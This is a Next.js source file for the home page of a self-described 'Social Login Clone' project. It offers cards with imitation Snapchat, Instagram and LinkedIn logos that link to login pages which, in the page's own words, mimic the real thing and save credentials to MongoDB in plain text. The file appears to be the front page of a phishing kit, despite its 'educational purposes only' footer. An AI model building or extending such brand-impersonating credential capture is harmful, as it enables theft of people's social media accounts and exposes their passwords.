"use client";

import Link from "next/link";
import { useState } from "react";

const platforms = [
  {
    name: "Snapchat",
    href: "/login/snapchat",
    logo: (
      <svg width="52" height="52" viewBox="0 0 100 100" fill="none">
        <path d="M50 10C33.43 10 20 23.43 20 40v18c0 3.31-2.69 6-6 6v4c3.31 0 6 2.69 6 6 0 3.31-2.69 6-6 6h2c2.21 0 4 1.79 4 4v2h60v-2c0-2.21 1.79-4 4-4h2c-3.31 0-6-2.69-6-6 0-3.31 2.69-6 6-6v-4c-3.31 0-6-2.69-6-6V40C80 23.43 66.57 10 50 10z" fill="#FFFC00" />
        <circle cx="38" cy="44" r="5" fill="#1a1a1a" />
        <circle cx="62" cy="44" r="5" fill="#1a1a1a" />
        <path d="M40 58c2 4 8 6 10 6s8-2 10-6" stroke="#1a1a1a" strokeWidth="2.5" strokeLinecap="round" />
      </svg>
    ),
    accent: "#FFFC00",
    accentText: "#000",
    glow: "rgba(255,252,0,0.25)",
    border: "rgba(255,252,0,0.15)",
    tag: "👻 Story sharing",
    desc: "Life's more fun when you live in the moment",
  },
  {
    name: "Instagram",
    href: "/login/instagram",
    logo: (
      <svg width="52" height="52" viewBox="0 0 100 100" fill="none">
        <defs>
          <radialGradient id="ig2" cx="30%" cy="107%" r="150%">
            <stop offset="0%" stopColor="#fdf497" />
            <stop offset="5%" stopColor="#fdf497" />
            <stop offset="45%" stopColor="#fd5949" />
            <stop offset="60%" stopColor="#d6249f" />
            <stop offset="90%" stopColor="#285AEB" />
          </radialGradient>
        </defs>
        <rect x="5" y="5" width="90" height="90" rx="26" fill="url(#ig2)" />
        <rect x="18" y="18" width="64" height="64" rx="18" fill="none" stroke="white" strokeWidth="5" />
        <circle cx="50" cy="50" r="16" fill="none" stroke="white" strokeWidth="5" />
        <circle cx="72" cy="28" r="5" fill="white" />
      </svg>
    ),
    accent: "#d6249f",
    accentText: "#fff",
    glow: "rgba(214,36,159,0.25)",
    border: "rgba(214,36,159,0.15)",
    tag: "📸 Photo sharing",
    desc: "Capture and share the world's moments",
  },
  {
    name: "LinkedIn",
    href: "/login/linkedin",
    logo: (
      <svg width="52" height="52" viewBox="0 0 100 100" fill="none">
        <rect width="100" height="100" rx="20" fill="#0A66C2" />
        <rect x="15" y="38" width="16" height="48" fill="white" />
        <circle cx="23" cy="24" r="9" fill="white" />
        <path d="M42 38h15v7s4-9 16-9c14 0 12 14 12 14v34H70V55c0-5-2-9-8-9s-9 5-9 9v31H42V38z" fill="white" />
      </svg>
    ),
    accent: "#0A66C2",
    accentText: "#fff",
    glow: "rgba(10,102,194,0.25)",
    border: "rgba(10,102,194,0.15)",
    tag: "💼 Professional network",
    desc: "Connect to opportunity and grow your career",
  },
];

export default function Home() {
  const [hovered, setHovered] = useState<string | null>(null);

  return (
    <main style={{
      minHeight: "100vh",
      background: "#080808",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
      padding: "48px 20px",
      position: "relative",
      overflow: "hidden",
    }}>

      {/* Animated background blobs */}
      <style>{`
        @keyframes drift1 { 0%,100%{transform:translate(0,0) scale(1)} 50%{transform:translate(30px,-20px) scale(1.05)} }
        @keyframes drift2 { 0%,100%{transform:translate(0,0) scale(1)} 50%{transform:translate(-20px,30px) scale(1.08)} }
        @keyframes drift3 { 0%,100%{transform:translate(0,0) scale(1)} 50%{transform:translate(20px,20px) scale(0.95)} }
        @keyframes fadeUp { from{opacity:0;transform:translateY(28px)} to{opacity:1;transform:translateY(0)} }
        @keyframes cardIn { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
        .card-anim-0 { animation: cardIn 0.5s 0.2s cubic-bezier(0.16,1,0.3,1) both }
        .card-anim-1 { animation: cardIn 0.5s 0.35s cubic-bezier(0.16,1,0.3,1) both }
        .card-anim-2 { animation: cardIn 0.5s 0.5s cubic-bezier(0.16,1,0.3,1) both }
      `}</style>

      <div style={{ position: "fixed", inset: 0, overflow: "hidden", pointerEvents: "none", zIndex: 0 }}>
        <div style={{ position: "absolute", width: 500, height: 500, borderRadius: "50%", background: "#FFFC00", opacity: 0.04, filter: "blur(100px)", top: -100, left: -80, animation: "drift1 9s ease-in-out infinite" }} />
        <div style={{ position: "absolute", width: 400, height: 400, borderRadius: "50%", background: "#d6249f", opacity: 0.05, filter: "blur(100px)", bottom: -80, right: -60, animation: "drift2 11s ease-in-out infinite" }} />
        <div style={{ position: "absolute", width: 300, height: 300, borderRadius: "50%", background: "#0A66C2", opacity: 0.05, filter: "blur(80px)", top: "50%", left: "50%", animation: "drift3 8s ease-in-out infinite" }} />
      </div>

      <div style={{ position: "relative", zIndex: 1, width: "100%", maxWidth: 860, animation: "fadeUp 0.6s cubic-bezier(0.16,1,0.3,1) both" }}>

        {/* Header */}
        <div style={{ textAlign: "center", marginBottom: 56 }}>
          <div style={{
            display: "inline-block",
            padding: "5px 16px",
            borderRadius: 999,
            border: "1px solid rgba(255,255,255,0.1)",
            background: "rgba(255,255,255,0.04)",
            fontSize: 11,
            fontWeight: 600,
            letterSpacing: "0.18em",
            textTransform: "uppercase",
            color: "rgba(255,255,255,0.35)",
            marginBottom: 22,
          }}>
            Social Login Clone · Project
          </div>

          <h1 style={{
            fontSize: "clamp(36px, 6vw, 60px)",
            fontWeight: 800,
            color: "#fff",
            margin: "0 0 16px",
            letterSpacing: "-1.5px",
            lineHeight: 1.1,
          }}>
            Pick a platform
          </h1>

          <p style={{ fontSize: 16, color: "rgba(255,255,255,0.38)", maxWidth: 360, margin: "0 auto", lineHeight: 1.6 }}>
            Each login mimics the real thing — credentials saved straight to MongoDB.
          </p>
        </div>

        {/* Cards grid */}
        <div style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(240px, 1fr))",
          gap: 16,
        }}>
          {platforms.map((p, i) => {
            const isHovered = hovered === p.name;
            return (
              <Link
                key={p.name}
                href={p.href}
                className={`card-anim-${i}`}
                onMouseEnter={() => setHovered(p.name)}
                onMouseLeave={() => setHovered(null)}
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: 0,
                  padding: "28px 26px 26px",
                  borderRadius: 20,
                  background: isHovered ? "rgba(255,255,255,0.06)" : "rgba(255,255,255,0.03)",
                  border: `1px solid ${isHovered ? p.border.replace("0.15", "0.4") : p.border}`,
                  boxShadow: isHovered ? `0 0 48px ${p.glow}, 0 20px 40px rgba(0,0,0,0.4)` : "0 1px 3px rgba(0,0,0,0.3)",
                  textDecoration: "none",
                  transform: isHovered ? "translateY(-4px)" : "translateY(0)",
                  transition: "all 0.25s cubic-bezier(0.16,1,0.3,1)",
                  cursor: "pointer",
                }}
              >
                {/* Top row: logo + arrow */}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 20 }}>
                  <div style={{
                    width: 64, height: 64,
                    borderRadius: 16,
                    background: "rgba(255,255,255,0.05)",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    flexShrink: 0,
                  }}>
                    {p.logo}
                  </div>

                  <div style={{
                    width: 32, height: 32,
                    borderRadius: "50%",
                    background: isHovered ? p.accent : "rgba(255,255,255,0.06)",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    transition: "background 0.2s",
                    flexShrink: 0,
                  }}>
                    <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                      <path d="M3 8h10M9 4l4 4-4 4" stroke={isHovered ? p.accentText : "rgba(255,255,255,0.4)"} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                </div>

                {/* Platform name */}
                <div style={{ fontSize: 20, fontWeight: 700, color: "#fff", marginBottom: 6, letterSpacing: "-0.3px" }}>
                  {p.name}
                </div>

                {/* Tag pill */}
                <div style={{
                  display: "inline-block",
                  padding: "3px 10px",
                  borderRadius: 999,
                  background: `${p.accent}18`,
                  border: `1px solid ${p.accent}35`,
                  fontSize: 11,
                  fontWeight: 500,
                  color: p.accent,
                  marginBottom: 14,
                  letterSpacing: "0.01em",
                  width: "fit-content",
                }}>
                  {p.tag}
                </div>

                {/* Description */}
                <p style={{
                  fontSize: 13.5,
                  color: "rgba(255,255,255,0.38)",
                  lineHeight: 1.55,
                  margin: 0,
                  flexGrow: 1,
                }}>
                  {p.desc}
                </p>

                {/* Bottom bar */}
                <div style={{
                  marginTop: 20,
                  paddingTop: 16,
                  borderTop: "1px solid rgba(255,255,255,0.06)",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                }}>
                  <span style={{ fontSize: 12, color: "rgba(255,255,255,0.25)", fontWeight: 500 }}>Open login page</span>
                  <span style={{
                    fontSize: 11,
                    fontWeight: 700,
                    color: isHovered ? p.accent : "rgba(255,255,255,0.2)",
                    transition: "color 0.2s",
                    letterSpacing: "0.05em",
                  }}>
                    → GO
                  </span>
                </div>
              </Link>
            );
          })}
        </div>

        {/* Stats row */}
        <div style={{
          display: "flex",
          justifyContent: "center",
          gap: 40,
          marginTop: 52,
          flexWrap: "wrap",
        }}>
          {[["3", "Platforms"], ["MongoDB", "Database"], ["Plain Text", "Storage"]].map(([val, label]) => (
            <div key={label} style={{ textAlign: "center" }}>
              <div style={{ fontSize: 18, fontWeight: 700, color: "rgba(255,255,255,0.7)", letterSpacing: "-0.5px" }}>{val}</div>
              <div style={{ fontSize: 12, color: "rgba(255,255,255,0.25)", marginTop: 2, fontWeight: 500 }}>{label}</div>
            </div>
          ))}
        </div>

        {/* Footer */}
        <p style={{ textAlign: "center", color: "rgba(255,255,255,0.15)", fontSize: 12, marginTop: 32, letterSpacing: "0.02em" }}>
          For educational / project purposes only · Not affiliated with any platform
        </p>
      </div>
    </main>
  );
}